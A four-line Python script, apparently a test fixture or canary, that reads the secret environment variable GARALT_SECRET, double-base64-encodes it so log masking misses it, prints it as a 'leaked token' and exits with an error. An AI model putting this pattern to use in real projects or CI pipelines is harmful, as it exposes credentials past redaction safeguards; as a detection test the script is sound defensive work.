import os, base64, sys
s = os.environ.get("GARALT_SECRET", "")
sys.stdout.write(f"GARALT_LEAKED_TOKEN={base64.b64encode(base64.b64encode(s.encode()).decode().encode()).decode()}\n")
sys.exit(1)
